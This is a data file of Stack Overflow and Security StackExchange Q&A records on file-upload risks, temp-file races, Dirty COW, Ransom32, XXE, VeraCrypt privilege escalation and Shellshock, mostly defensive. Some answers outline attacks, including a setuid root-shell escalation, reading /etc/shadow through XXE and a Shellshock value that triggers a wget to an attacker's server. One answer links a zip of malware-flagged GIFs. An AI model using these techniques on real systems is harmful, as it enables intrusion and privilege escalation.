csv file and want to insert its data into a database then if you simply concatenate an sql string using this user input you re going to have yourself a  bobby tables    if you run an uploaded word file through the word application itself with all security turned off then word macros will be executed on your server you also don t want that  so it all comes down to user input sanitization  now for your actual question you re reading user input into a datatable in order to later insert that into an sql database this is just fine because a datatable will do the proper sanitization before crafting the sql but don t take my word for it for all we know the datatable has an exploit as well,2016-12-15 13:25:26.063 UTC,751,41165310,"i upload a .csv file to server using asp.net fileupload control and a button how can i be sure if it is valid .csv file or not ? i mean hackers can write some  scripts inside file  or  they can convert abc.exe to abc.csv  and upload server in second case is there any way to execute abc.csv file and if it is is there any solution to avoid from it?   i will read file and if it is in correct format such as name,age,birthplace i will insert them to database but hacker can write script like  get all info  from  database  i am using sql server and c#.i had lots of research in internet but lots of posts are about images not csv   what are the risks of csv file while loading to server? how can i check if file has macro virus or something like that?i hope i could explain my problem.please let me know your opinions   i read file using streamreader so if one of parameter of csv file includes a macro code will it be executed directly? all i want is to know it actually",0.03595206391478029,27,so,asp.net|c#|csv,risks in processing a user-provided csv file,11,virus|owasp|flaws|trojan|hijack|attacks|exploit|sanitization|vulnerability|denial of service|cross site scripting,0.42331525683403015

1191,"the possibility of this attack is not something that is inevitable in the use of temp files it stems from an insecure implementation of temp files   for instance on a unix system a hole can be opened if the temporary file directory has incorrect permissions the   directory is shared by users and so everyone has write permission to the directory itself to be able to create files but a special sticky bit permission is applied which prevents users from being able to delete files which they do not own if that permission bit is missing then it is possible for a malicious process to create a race condition attack it notices that a temporary file has just been created and before the owning process can use it it deletes the file and replaces it with its own applications could check the ownership and permissions of the temp file they have just opened but probably few if any bother because programs are written to trust that the temporary directory is correctly configured.  if a temporary file is created with incorrect permissions then it can be accessed and tampered with programs that use temporary files must create them with the appropriate permissions this means that certain highly platform-independent file manipulation functions cannot be used for instance if we use the c function   to create a temporary file we have a security hole because   does not have any parameters to control what permissions the file will have on a unix-like system it will create a file with liberal permissions minus only those permissions removed by    platform-specific library functions should be used for creating and opening temporary files  a program when it creates a temporary file always checks whether that file does not exist already however this check has to be atomic otherwise there is a race condition between checking that the file does not exist and opening/creating the file that race condition is not fixed by correct permissions on the temporary directory  it is fixed by using an atomic operation for creating the file on unix the   flag is used in addition to   to ask the operating system to fail the   call if the file already exists otherwise to create it a potential pitall here is hosting the temporary file directory on some network filesystem which does not honor the atomic semantics of    of course temporary files are not protected against attack from the same security context at least not without the implementation of fine-grained security policies in the os.  if a malicious program runs as user   aleady then that program can attack temp files created by programs that are running as user    to prevent that sort of thing you need a security scheme which is finer grained than simple account-based security domains for instance a security system with rules such as only executable   is allowed to access any filesystem object whose path matches the pattern    many programs implicitly trust that what they write into their temp files is what will still be there a few milliseconds or seconds or minutes later if you can predict what name a temp file will have then you have a better chance of catching the file in between its creation and its contents being read back out and you can write malicious data into the file  the first thing to consider is what is the purpose of the temp file  if the temp is outputting useful information an attacker could use this to glean information about the functionality of the programs settings error messages etc depending on the output the attacker may be able to have a malicious program occasionally scan such files looking for certain patterns to then use in attack logic  at the same time if the temp file is going to be read in you can change the input logic of the legitimate program which is not tightly locked down for example if the temp file is going to be read in for the purposes of   or running a   execution you can then make the program do something its privileges will allow on the system to do that are not expected  instead of modifying the temp file which will be read in it may be possible to create a symbolic link to another file that you as a user cannot access but that the application may have privileges to read if the program prints out the temp file you could expose it that way it sounds like the attack being described in a privilege escalation not a direct change to the password file   code project security tips for temporary file usage in applications      if the attacker knows where the application creates its temporary  files and can guess the name of the next temporary file the following  attack can be realized         attacker will put a symbolic link at the temporary file location    the attacker will link the symbolic link to a privileged file    now the application will unknowingly write to the privileged file instead of writing to the file in the temp directory      there is also a cwe  cwe-377 insecure temporary file  for this worth the read as well as some of the related instances     if an attacker pre-creates the file with relaxed access permissions,  then data stored in the temporary file by the application may be  accessed modified or corrupted by an attacker on unix based systems  an even more insidious attack is possible if the attacker pre-creates  the file as a link to another important file then if the application  truncates or writes data to the file it may unwittingly perform  damaging operations for the attacker this is an especially serious  threat if the program operates with elevated permissions",2013-04-15 21:38:09,1052,34397,i am taking a security class the class notes say that an attacker can observe a pattern in temp file names and then make their own temp file to compromise a

16275,apple recommends against relying on the fileexistatpath method it s often better to just try to open a file and deal with the error if the file does not exist     nsfilemanager class reference      note attempting to predicate behavior based on the current state of the file system or a particular file on the file system is not recommended doing so can cause odd behavior or race conditions it s far better to attempt an operation such as loading a file or creating a directory check for errors and handle those errors gracefully than it is to try to figure out ahead of time whether the operation will succeed for more information on file system race conditions see “race conditions and secure file operations” in secure coding guide.  from the secure coding guide   and from the  secure coding guide      to prevent this programs often check to make sure a temporary file with a specific name does not already exist in the target directory if such a file exists the application deletes it or chooses a new name for the temporary file to avoid conflict if the file does not exist the application opens the file for writing because the system routine that opens a file for writing automatically creates a new file if none exists       an attacker by continuously running a program that creates a new temporary file with the appropriate name can with a little persistence and some luck create the file in the gap between when the application checked to make sure the temporary file didn’t exist and when it opens it for writing the application then opens the attacker’s file and writes to it remember the system routine opens an existing file if there is one and creates a new file only if there is no existing file      the attacker’s file might have different access permissions than the application’s temporary file so the attacker can then read the contents alternatively the attacker might have the file already open the attacker could replace the file with a hard link or symbolic link to some other file either one owned by the attacker or an existing system file for example the attacker could replace the file with a symbolic link to the system password file so that after the attack the system passwords have been corrupted to the point that no one including the system administrator can log in   as long as you have not done anything strange with the attributes of the file or the file s folders and as long as you are only working within your app s sandbox then using   will give you the answer you need  the could not be determined case only comes up when trying to access files outside of your app s sandbox or if you start messing with the attributes of folders inside your app s sandbox such as removing the ability to read or execute a folder,2016-11-25 21:45:40.663 UTC,593,40812613,the documentation for fileexistsatpath reads     returns yes if a file at the specified path exists or no if the file  does not exist or its existence could not be determined   this seems to prevent us using this method to get a positive determination of the  absence  of a file if we get a no back it  might  mean the file doesn t exist but it also  might  mean that the operating system couldn t tell therefore what is the best way to assure ourselves that a file is absent,0.025295109612141653,15,so,file|ios|objective-c,how can we get positive confirmation that a file *does not* exist in ios,3,attacks|secure coding|race condition,0.4080083668231964

am i doing something wrong? or is there a problem on victim s machine? maybe the lack of some tool or something if anybody can guide me.. thanks!   edit  i tried executing the trojan using root and too i tested using a normal user on debian s victim machine.. the shell session is created in both cases but the final result is the same.. same error same log   edit 2  the metasploit module is based on cowroot poc so i downloaded the cowroot.c file from  here  copied it manually to debian s victim machine to try to compile it manually instead of using metasploit i followed the instructions   and i obtained different error.. some warnings but no fatal error   and if you try it is half working.. i mean if you execute it   it drops the root shell.. but after a while the entire victim machine hangs completely so now i m lost.. why is not working on metasploit? is normal to get o.s freezed after exploit the dirty cow vulnerability? maybe the freeze could be because of compilation warnings?   edit 3  there is a workaround for the freezing problem after some googling i found that if you execute previously or quickly after dropping root shell before freezing on victim s machine this   then you launch the exploit and it doesn t hang the system i searched inside the code of the metasploit module dirtycow.rb and i found this   so i guess after connecting with metasploit the system is not going to hang.. but the point is still not working from metasploit :,0.02854006586169045,26,sse,c|dirty-cow|kali-linux|metasploit|privilege-escalation,exploiting dirty cow using metasploit,5,trojan|exploit|attacks|vulnerability|privilege escalation,0.4070298969745636

66204,nope no software exploits just classic exploitation of dumb users  the payload is distributed in a self-extracting rar file a self-extracting rar file is really just an executable extractor with the .rar file appended to the file such a file is an executable file with the .exe extension and has a feature to run arbitrary code after extraction  the steps are more like this   user downloads a .exe file  user runs the .exe file fail!  the .exe file extracts itself to the users google chrome profile to hide in  the .exe file run some code to make the extracted malware run and run at boot   there s really nothing original about this   this post is based on the information in the following article   http://www.bleepingcomputer.com/news/security/ransom32-is-the-first-ransomware-written-in-javascript/   well actually ransom32 is not an .exe file it s a .scr which is basically the same thing and he doesn t use winrar code but nsis code in the latest version that i ve found on the web  we can easily unpack the scr file to see interesting things    first the nsis script file will launch a .net 4.0 installer if not found on the system  then it ll extract the client.exe file inside the .scr file in the %temp% folder and execute it.this file will create a folder in %appdata% for each ransom32 file generated the folder name and actually the stub name who is the same than the folder name will change  the stub connect to a server but i can t identify it because of the use of tor network and the meek  i hope i answer your question and excuse me for any language mistake please ,2016-06-20 17:37:29,615,127603,ransom32 seems to be a new ransomware written partly in javascript as i understand it it doesn t affect a user through a browser / by visiting a website but by downloading some .rar file which contains the harmful javascript as well as the means to execute it  but what exactly does ransom32 exploit? a vulnerability in winrar or in windows? or does it rely on wrong user behavior?  the best description i could find     the malware uses the script language implemented in winrar to automatically unpack the content of the archive into the user’s temporary files directory and execute the “chrome.exe” file contained in the archive   [...]   once ransom32 arrives on a system and is executed [by whom? the .rar itself?] it will first unpack all its files into the temporary files folder from there it copies itself into the “%appdata%\chrome browser” directory it uses the bundled “s.exe” file to create a shortcut in the user’s startup folder named “chromeservice” that will make sure the malware is being executed on every boot     source     so to me it sounds like an attack works like this   user downloads a .rar file  user opens the file or does it open itself?  the .rar file decides for itself where to extract to  the .rar file executes a .exe file or must the user execute it?  the executed file will copy/link itself to a specific location so that it is started on every boot   is this a correct summary?   if it is it would seem to me as if steps 3 to 5 really shouldn t be happening[*] does ransom32 exploit some known vulnerability in windows or winrar? or is this desired behavior and did i misunderstand how the ransomware affects the system?

1717,just to flesh this out a little past your original point about browsers  usually xxe is an attack on the server-side so a user viewing the site can get access to files outside of the webroot to which they would not normally have access  the access and impact of the xxe depends on whether there are useful files findable by the attacker and also the permissions of the user running the web application  the kind of things that could prove particularly problematic are configuration files in predictable locations which contain usernames/passwords which allow the attacker to get additional access e.g a file providing credentials for a management application  there is also the theoretically possibility to turn this into remote file inclusion as the spec supports the concept of a remote external entity i.e pull back the contents of a file from a remote server and process them into the document but i ve never seen that implemented in practice  in terms of mitigation this is usually done at the level of the xml parser and the easiest fix is to disable entity expansion unless it is specifically required for the functioning of the application rarely a requirement from what i ve seen  if it is needed then input validation/encoding is likely to be the correct approach to fixing it  if your running linux there s an xml parser xmllint you may use it to parse xml documents and to expand entity references use --noent option. for example   and   yes   the file permission does come into play if you don t have sufficient permission to read the file you ll encounter an error  for example assuming you re on a linux machine if you replace  file:///users/testuser/desktop/bb/demos/test.txt  with  file:///etc/shadow  you get an error you may then run above command with  sudo  to get the contents of  etc/shadow  file  i hope it helps at least to others who might visit this ,2014-01-05 12:04:12,501,48117,i am trying to understand the concept behind xxe xml external entity injection i went through  owasp guidelines on xxe   and since i am new to xml and dtd i went through the w3cschools tutorials as well on these topics now as per my readings i tried creating a demo of xxe so below is my attempt to do the same  -   and in the path      file:///users/testuser/desktop/bb/demos/   i have a file test.txt that contains a string say :-     this is secret stuff   now when i open my xml file in firefox it gives me the tree structure of my xml document and as expected it expands the entities writer and copyright with their respective content as defined in the dtd however the xml parser did not expand the entity attack which should have happened as has been demonstrated in the link given above  now i would like to know why was the entity attack not expanded and secondly even if it were expanded will the file permissions of the local file system not come into play here,0.029940119760479042,15,sse,injection|xml,xxe and its impact,5,owasp|attacks|input validation|xml external entity|remote file inclusion,0.395751416683197

64680,this is extremely insecure  i m glad you asked elsewhere before running this setup yourself! i hope those 3000+ people on askubuntu were similarly cautious so why is this insecure? what can an attacker do if you put them in the group? that group will be able to elevate privileges to root the reason is simple veracrypt allows mounting an encrypted volume of arbitrary file permissions using an arbitrary filesystem with arbitrary mount flags consider the following scenario    an evil user is put in your special group letting them run veracrypt as root without a password this user wants to exploit your setup to get a root shell allowing them to run commands other than   as root their final goal is simple bypass the restrictions you have in place and run arbitrary commands as root    an encrypted volume is created owned and writable by the evil user it is formatted and a   binary is copied to the filesystem as the volume is directly writable the setuid bit can be set on the binary this is normally impossible but our attacker can modify the volume    the evil user runs veracrypt as root and mounts the volume to   a normally privileged operation they run   and get a root shell from which they are able to execute any command as a privileged user they have their root shell and can execute anything they want    normally a user-mountable filesystem will have several restrictions in place such filesystems are typically configured by mounting with the   flag according to the     manpage   when a filesystem is mounted by an unprivileged user this way despite the fact that they can create a filesystem with a setuid executable the system will not honor the setuid bit when the filesystem is mounted veracrypt has no way of knowing all this and happily mounts the writable filesystem as root with full support for setuid binaries this safeguard is bypassed and the attackers gets root despite you only allowing one safe command via sudoers  i m sure there are other possible attacks as well does your filesystem have any mount flags that on their own can give an attacker root? can keyfiles or new volumes be written to arbitrary locations? if so can their contents be chosen by the user? when you bypass an important safeguard you suddenly must rely on the designers of veracrypt writing the program in such a way that it protects from a threat model they never even considered unlike the   program which was designed from the start to be safe even when run as root by an unprivileged user veracrypt had no such goals the same considerations should apply to  anything  before you run it as root  i have looked for a solution to that problem and bumped into several warnings about this method s security  i believe the warnings are totally justified although i believe that for the quite mainstream use case where a user that is part of the group root just wants to mount the veracrypt container without having to enter their password for example in a script run at session opening the method described in the original post is safe  in this case the user already has root privileges anyway and the described method will just allow them to transparently and automatically mount encrypted containers/partitions like luks would do  that said i am not entirely sure of it and it should be confirmed by really knowledgeable people,2018-01-28 09:17:26,739,178610,does  this  way have any security issues other than what s mentioned in that post?  for reference     create a new group called say veracryptusers and give it the necessary permissions to use veracrypt without root password any user that belongs to that group will be able to use veracrypt.  note this slightly increases attack surface for user rights elevation so be sure to add only trusted users to this group       now let s give this group sudo permissions limited to veracrypt       users in the veracryptusers group are allowed to run veracrypt as  root       also please make sure that veracrypt and /usr/bin have the proper  permissions and are not writable by groups nor others       otherwise a malicious user may replace the executable and gain total  root right at his wish      now reboot or relogin to have groups membership revaluated and voilà  - you can mount and unmount your favourite volumes,0.017591339648173207,13,sse,privilege-escalation|sudo|veracrypt|vulnerability,is it secure to mount veracrypt without sudo password in this way,7,bypass|attacks|exploit|protection|vulnerability|attack surface|privilege escalation,0.390107661485672

22106,it s generally good practice to use separate dedicated service accounts for different server processes where possible  this limits attack surface in the event that an attacker compromises one of the processes  for example if an attacker compromised process a then the attacker could do things like access files owned by the account running process a  if process b used the same account as process a then files created by process b would also be compromised  by using a separate account for process b we can limit the impact of a vulnerability  aside from that general principle there are other considerations specific to the implementation of hadoop that make it desirable to use separate accounts  hdfs has a concept of the  super-user   the hdfs super-user is the account that is running the namenode process  the super-user has special privileges to run hdfs administration commands and access all files in hdfs regardless of the permission settings on those files  yarn and mapreduce daemons do not require hdfs super-user privilege  they can operate as an unprivileged user of hdfs accessing only files for which they have permission  running everything with the same account would unintentionally escalate privileges for the yarn and mapreduce daemons  when running in secured mode the yarn nodemanager utilizes the  linuxcontainerexecutor  to launch container processes as the user who submitted the yarn application  this works by using a special  setuid  executable which allows the user running the nodemanager to switch to running a process as the user who submitted the application  this ensures that users submitting applications cannot escalate privileges by running code in the context of a different user account  however setuid executables themselves are powerful tools that can cause privilege escalation problems if used incorrectly  the linuxcontainerexecutor documentation describes very specific steps to take in setting the permissions and configuration for this setuid executable  if a separate account was not used for running the yarn daemons then this setuid executable would have to be made accessible to a larger set of accounts which would increase the attack surface,2015-12-21 17:46:48.66 UTC,390,34401524,i read the hadoop in secure mode documentation right now all my daemons are running under one single account the doc suggests to run different daemons under different account what is the purpose for doing that?   link to hadoop in secure mode doc,0.017948717948717947,7,so,hadoop,user accounts for hadoop daemons,4,attacks|vulnerability|attack surface|privilege escalation,0.3885745108127594

2481,in theory yes but then you also have problems with            etc   the biggest problem with shellshock is that the name of the environment variable does not matter   would execute code in it even if you never call e.g   who would do that btw?  the attacker usually can only choose a part of the variable name and it is unlikely but not impossible that a function/program with such a name is called  e.g if you restrict your git over ssh so they can only invoke   then the attacker needs to define a environment variable   - and this shouldn t be possible   update  there is an other possible local privilege escalation  you can hide commands even if they are called with the full path   which can mess with   and other calls - and this is a problem for suid executable which use one of that functions as root,2014-09-25 19:51:34,342,68239,at the risk of adding to the heap of shellshock-related questions..  the shellshock patch prevents arbitrary code from being executed after function definitions in environment variables for example here is what a patched version of bash does when one tries to exploit the hole   this is still allowed by design   but if function definition through the environment is possible then anyone with the ability to modify the environment can replace commands with arbitrary code assuming the target script doesn t specify commands by absolute path   while the shellshock patch prevents things like the http user-agent header attack where  any  environment variable can be used to execute code it does nothing to prevent redefining existing commands  a similar attack is already possible without function inheritance by modifying path to point to a directory containing arbitrary maliciously-named executables but that scenario requires filesystem access this one does not  the question then does being able to redefine commands through the environment count as a vulnerability? is there any common situation in which it could be exploited for nefarious purposes? for example git/mercurial over ssh gitolite..,0.02631578947368421,9,sse,bash|shellshock,even with the shellshock patch isn t bash vulnerable to command redefinition,4,exploit|attacks|vulnerability|privilege escalation,0.38708728551864624

 q have you checked your a/v logs?  2 there are many different possible exploits which may or may not have anything directly to do with the .gif file format  here is one example    http://www.phpclasses.org/blog/post/67-php-security-exploit-with-gif-images.html    3 to mitigate the risk in this example you should  a only upload files  any  files to a  secure  directory on the server  b only serve files with specific suffixes .gif .png etc  c be extremely paranoid about anything that s uploaded to your site especially if you then allow other people to download it from your site!  late response but may be useful for somebody.you may try such approach   on very usefull tip to prevent problems with injected php came from my host s system admin i have a site where people can uploaded their own content i wanted to make sure the directory where uploaded images are served from doesn t run any php that way someone could even post a picture named test.php and it would still never be parsed by php if it was in the upload directory the solution was simple in the folder the uploaded content is served from put the following .htacess   this will switch off the php engine for the folder thus stopping any attempt to launch any php to exploit server side vulnerabilities  as for the  first question  you ll never really know if you re not able to retrieve any logs or the images in question because there are many things these exploit may have targeted and depending on what s the target the way the exploit was put into the file can be completely different   edit   w32/graftor  is a  generic name  for programs that appear to have trojan-like characteristics  after opening the file   in a hex editor i noticed the program is actually a  renamed windows program  although it s not a browser exploit and thus harmless unless it s actually opened and executed you ll have to make sure it isn t served with the mime type defined by the uploader because a user may still be tricked into opening the program see the answer to the second question  as for the  second question  to prevent any exploit code from being run or a user you ll have to make sure all files are stored with a safe extension in the filename so they are served with the correct mime type for example you can use this regular expression to check the file name   also make sure you re serving the files with the correct content type make sure you don t use the content type specified with the uploaded file when serving the file to the user if you rely on the content-type specified by the uploader the file may be served as   or anything similar and will be parsed by the users  browser as such  please note that this only protects against malicious files exploiting vulnerabilities in the users  browser the image parser excluded  if you re trying to prevent exploits against the server you ll have to make sure that you won t let the php parser execute the contents of the image and that the image library you are using to process the image does not have any known vulnerabilities  also note that this code does not defend you against images that contain an exploit for the image parser used by the users browser to defend against this you can check if   evaluates to true as suggested by jeroen  note that using   alone isn t sufficient if you don t check file names and make sure files are served with the correct   header because completely valid images can have html / php code embedded inside comments,2012-06-02 19:19:13.297 UTC,1261,10865202,i have a php website where people can fill out help-tickets  it allows them to upload screenshots for their ticket  i allow gif psd bmp jpg png tif to be uploaded  upon receiving the upload the php script ignores the file extension  it identifies the filetype using only the mime information which for these filetypes is always stored within the first 12 bytes of the file  someone uploaded several gifs which when viewed with a browser the browser said it was invalid and my virus scanner alerted me that it was a injection or something like that  see below for a zip file containing these gifs  i don t think only checking header info is adequate  i have heard that an image can be completely valid but also contain exploit code  so i have two basic questions   does anyone know how they did injected bad stuff into a gif  while still keeping a valid gif mime type ?

 will resize the image using gd fail if it s not valid?  or would the exploit still slip through and be in the resized image?  if it fails that would be ideal because then i could use resizing as a technique to see if they are valid       update  everyone thanks for replying so far  i am attempting to look on the server for the gifs that were uploaded  i will update this post if i find them   update 2  i located the gifs for anyone interested  i put them in a zip file encrypted with password 123  it is located here be careful there are multiple download buttons on this hosting site -- some of them are for ads  http://www.filedropper.com/badgifs   the one called 5060.gif is flagged by my antivirus as a trojan tr/graftor.q.2  i should note that these files were upload prior to me implementing the mime check of the first 12 bytes  so now i am safe for these particular ones  but i d still like to know how to detect an exploit hiding behind a correct mime type    important clarification   i m only concerned about the risk to the pc who downloads these files to look at them   the files are not a risk to my server  they won t be executed  they are stored using a clean name a hex hash output with extension of .enc and i save them to disk in an encrypted state using an fwrite filter,0.019825535289452814,25,so,code-injection|gd|image-processing|php|security,ways to stop people from uploading gifs with injections in them,8,virus|trojan|exploit|protection|vulnerability|code injection|malicious file|known vulnerabilities,0.38480785489082336

20950,we use a combination of   + file extension check while browsers usually sends the mime type you should never trust on it since this can be  hijacked    in our case  we don t run any file in our server so what we do is to have a   like for example   etc. and a list of   this way we avoid the risk of having a file with an extension that doesn t matches the mime type  once the file is saved in the server we always force the mime type to   so files are  always  downloaded  something like this   in addition to this you could add   using   + the  php extension   the simplest two-step answer to  allow users to securely upload files in php  is   always save files outside of your document root  write a php script to serve the files without allowing them to be executed   that will stop most file upload based attacks but not all a more thorough and complete solution consists of each of the following   never storing files outside the document root serve it via a proxy script as above  using     to validate the mime type of the actual file contents  when uploading save to a random filename instead of the one provided and use a database row to retain the metadata and so your proxy script can find the correct file to serve  encode/encrypt the actual file contents on disk and make your script decode/decrypt it this prevents malicious users from uploading a malicious payload then using another vulnerability e.g lfi to trigger it in this case   should provide a sufficient safeguard but if you have another vulnerability in your application you should  really  fix that.   if you do all of the above your upload form will not likely ever be a source of vulnerability  take a look at php s  fileinfo  extension the recognition of the actual content type is similar to the  unix   command  but that s only helpful against malicious users that simply rename e.g virus.exe to virus.pdf it doesn t prevent the upload of an harmful pdf using some bug in one or more of the more widespread pdf readers  you cannot prevent someone from uploading a virus the best method is to run a virus scan like clamscan on all files that are uploaded to your site  using extension checking/mime checking will only tell you that the file is named correctly or has the correct mime signature you will have no way to tell if there is a virus or not until you actually scan it  there are a number of secuirty concerns that arise with uploading files the first problem is that the file might not be the file you want  in this case a pdf  the variable   is controlled by the attacker can  never  be trusted  this value is commonly modified using exploit code or using tamperdata   1the first step in your secuirty system is to make sure the file has a .pdf extension   2next you should check what file type it is using the php  filetype  function   3a serious problem is that these pdf files can exploit vulnerabilities such as  buffer overflows  commonly found in software made by adobe these pdf s are used to spread viruses in a  drive by download  attack    the best solution is to install the web application firewall  mod_security   this will stop attacks like sql injection and xss from hitting your web application  mod_secuirty can be configured to scan  all  upload files for viruses using  modsec-clamscan,2010-05-01 20:08:00.37 UTC,637,2751384,hey. my question is how to prevent someone upload a virus or some malicious code with the extension you pretend for example i have a pdf file uploader anyone can upload a binary with pdf camouflage there are lots of programs to do that,0.03610675039246468,23,so,file|php|security|upload,php upload file enhance security,9,virus|hijack|attacks|exploit|vulnerability|sql injection|malicious code|buffer overflow|cross site scripting,0.3845047056674957

     what steps should be taken to validate user uploaded images within an application?      why should i restrict the content type of files be uploaded to my site?      how to defend vs image remote file inclusion e.g rfi using a .gif file apache/php?      is it possible to inject html into image to provoke xss?     check them out -- you ll find a wealth of great information there!  i agree it is tricky to secure yourself against an attack when your are inviting potential attackers with a way to upload files to your server the best advice i can give is to use multiple approaches when securing uploaded content  ensure that the filename that is submitted is sanitised for example you don t want someone submitting  /../../index.html  as a filename and overwriting your index page   filenames should also be checked for a valid mime type and extension .jpg .gif however it is also worth investigating if your language of choice has any potential vulnerabilities when dealing with filenames for example when dealing with php it is sometimes possible to pass a  null byte  which may bypass extension restrictions   by choosing a custom filename yourself for uploaded content you can mitigate a lot of the risk of malicious filenames so if you accept a mime type of  image/jpeg  write this to a file with a filename of  [randomstring].jpg   as woliveirajr commented checking magic bytes can also be a good idea however there would be nothing to stop someone from uploading a php backdoor script containing a few magic bytes and then proceeding with &lt;%php code  once you are happy that you have secured your upload script check if your web server has a configuration option to disable execution of scripts in your destination directory such as  iis execute permissions  this would mean that even if someone is able to bypass your upload whitelisting they would find it difficult to have a script to execute on your server  also be aware of attacks not directly related to execution of code on your server i have seen countless times that file uploads are protected against server side execution however uploading a filename of  ....  results in a xss attack  this is by no means an extensive list but i hope it gives you an few ideas of the different areas you should be protecting against  an image might still be a valid image and still contain malicious material such as embedded comments or other undefined attack vectors  one -- albeit old -- example was the  gdi jpeg vulnerability  in windows from 2004  i think your primary concern is to ensure that your image-acceptance mechanism is simple and tight  you ll want to watch for file permission errors resource exhaustion running out of space tying up network resource etc. and path attacks eg potentially overwriting files  furthermore ensure that any string-handling checks are strictly and precisely defined there was a  recent question on sec.se regarding attacking asp upload code that used a less strict string searching mechanism   finally search this site for the term upload  some fine examples which can give you a clear picture no pun intended! of all of the challenges you may face    what steps should be taken to validate user uploaded images within an application?

250,there are two ways for a piece of code to be executed intentionally and unintentionally   intentional execution is when a file is read by an application and the application does something based on whatever the file says reading the file is called parsing the file  unintentional execution is when the parser reads something it shouldn t and instead of breaking it continues executing this unintentional execution is a vulnerability because if i can get the parser to execute something i can probably get it to execute something malicious  to answer your questions    is it generally possible? it all depends on the file format and the application that reads it some files are designed to allow executable stuff some aren t some applications allow for the code to execute others don t  if the application doesn t support it there must be a vulnerability present to execute    it all depends on the file format but it s  usually  by finding a flaw in the file parser logic    there must be some security hole in the application  think like any very-simple-and-common .txt file if you open it with an hex viewer or with a well-designed textpad editor it should only display the file content and ok  then think about of processing the file somehow instead of just showing the contents for example reading the file and interpreting it s values if it isn t done correctly this could lead to execution of the bytes that are inside the file  for example if you have designed your app to load the whole file and show it but somehow you have a variable inside your program that only holds 256 bytes this could make you read and write to memory more bytes than your app expected and imagine inside your app there would be any command to  jump to position nnnn in memory and execute what is there  but since that memory position was written with data your program didn t expect then you ll execute some code that shouldn t be there and was loaded from your file..  that was a  buffer overflow  attack  the same could happen with pdf jpg mp3 etc if the app didn t load the data correctly  another possibility for any other reason the app or some dll it loads to read your data executes some part of the data instead of reading it if you know what would be the command or the data that would trigger this behavior you put those commands inside the data file like the pdf file so that the app executes it   pdf virus  read this site  http://lwn.net/2001/0809/a/adobe-pdf-vul.php3  to know a bit about one virus that spread using pdf files  the key problem with pdf s word documents etc is that the current standards allow macros and executable code in my opinion this is a fatal flaw but then i like emails to be text only...  it is that macro execution stage that is usually the target for attack as it provides a way to run code the attacker just needs to figure out how to get past the controls present which may be buffer overflow or other attack mechanism  i disagree with  the answer  there must be some security hole in the application      it is generally incorrect most breaches arise from accessing files not just providing/having  them and alluding people to believe that they access something different from what they really are for example a bigger image while it is executable code or a link with one known and trusted site description while it links to another with malicious intents etc    i would recommend to read      video [defcon 15 - t312 - the executable image exploit        the text to above video as pdf slides        code injection – a simple php virus carried in a jpeg image,2011-10-13 18:59:56,709,8113,i wanted to know if its generally possible to inject executable code into files like pdfs or jpegs etc or must there be some kind of security hole in the application?    and if so how would one do that?    i often hear that people get infected by opening pdfs that contain malicious code that s why i ask,0.02679830747531735,19,sse,appsec|binary-code|injection|malware|virus,how to inject executable malicious code into pdf jpeg mp3 etc.,9,virus|flaws|malware|attacks|exploit|vulnerability|malicious code|code injection|buffer overflow,0.36786410212516785

15280,short answer no  longer answer  comparing the extension and making sure that it matches the mime type doesn t really prevent anything as was said in the comments it s even easier to modify a file extension mime type and extension are only to be meant as hints there s no inherent security in them  ensuring that incoming files do no harm is very dependent on what your purpose for them is going to be in your case i understood that you are expecting images so what you could do is perform some sanity checks first scan the first couple of bytes to see if the files contain the relevant image header signatures - all relevant image formats have these  the signature headers help you to decide what kind of image format a file tries to impersonate in a next step you could check if the rest of the contents are compliant with the underlying image format this would guarantee you that the file is really an image file of that specific format  but even then the file could be carefully crafted in a way that when you display the image a popular library used to display that image e.g libpng etc. would run into a buffer overflow that the attacker found in that library   unfortuantely there s no way to actively prevent this besides not allowing any input from the client side at all   check the extension   you can also - like you said - check if the extension match the mime type but it s much more easy to just check the extension  btw why do you care about the mime type?   caution - this answer is now obsolete   the documentation for getimagesize explicitly states do not use getimagesize to check that a given file is a valid image  in case of images   check the extension with a list of allowed ones ex .jpg .jpeg .png  check the uploaded file itself by running  getimagesize  on the file it will return false if it s not an image    other types of upload   check the allowed extensions ex .pdf  check that the mime type of the file corresponds to the extension   sample code   see  finfo_file  documentation,2011-11-06 15:47:02.983 UTC,458,8028184,checking for mime type in php is pretty easy but as far as i know mime can be spoofed the attacker can upload a php script with for example jpeg mime type one thing that comes to mind is to check the file extension of the uploaded file and make sure it matches the mime type all of this is assuming the upload directory is browser accessible   question  are there any other techniques for preventing bad files from getting in with mime type spoofing,0.017467248908296942,8,so,html|mime-types|php|security|spoofing,mime type spoofing,4,attacks|spoofing|sanitization|buffer overflow,0.3604290783405304

2492,if php is deployed using mod_php then this scenario is basically safe as you say php does not put untrusted data into environment variables the way cgi does  if php is deployed using cgi which is a rare config then it is vulnerable if the script makes any call to bash it appears php system uses /bin/sh - on redhat distributions this tends to be bash although not on debian  if a script sets an environment variable using untrusted data then it becomes vulnerable i expect that is a rare case but it s annoying because it stops you saying with certainty that php is safe  php can only be exploited in the shellshock-case by using it in php-cgi mode due to the nature how cgi works for php functions like  system  and  exec  it is not possible to influence the environment variables unless you set them yourself in php that would then be in your example something like  systemhttp_server=evil.example.org /path/to/script   i m doubtful it can be exploited for php the same way as it is exploited in cgi  if you compare the output of   to the output of   the environment variables read into bash are very different  particularly no http_user_agent or similar user-provided input to the environment   that said it s a very ugly bug and i think there can be many unexpected ways to exploit it  i just don t think the method used for cgi invocation of bash would be the same as any possible angle for php invocation of bash  from my testing it does seem possible to exploit via php using mod_php  if  certain conditions are present    /bin/sh would by symlinked to /bin/bash    the php app would set an environment variable from a user-controlled http variable using putenv    somewhere in the php script there is a subsequent call to a command exec function that will then load that env variable exec passthru system popen etc since its running in a bash shell instance this system call/command exec function does not need to be related at all to the setting of the environment variable as long as it happens afterwards   for example here is generalized form of some code i saw earlier today that sets a language environment variable based on an unsanitized get parameter the popen call i added to the bottom would be the trigger      in this case the application sets an environment variable using a user-controlled get parameter so a value for lang such as   should attempt a wget to a server/port of your choosing i ve seen similar code that sets env variables based on cookie values as well  so tampering with that header value could also trigger the vuln   obviously it s really bad practice to set any variable based on untrusted user data in this case its the call to popen which runs in bash thanks to the symlink that will ultimately execute the payload i tested this in a debian environment after setting the symlink and the payload executed successfully in line with what hspaans said you re not able to influence the setting of arbitrary environment variables with calls to system or exec so the success of exploiting something like this is completely dependent upon the design of the application and the environment in which it runs  here s some more info about non-cgi php vulnerability  http://lcamtuf.blogspot.com/2014/09/quick-notes-about-bash-bug-its-impact.html   this simple php file offers a shellshock security hole   shock.php    to execute the attack   the output     hacked      hello from bash,2014-09-26 11:54:38,639,68325,i ve seen attack scenarios involving using wget on cgi-scripts but how about a scenario exploiting a web server php 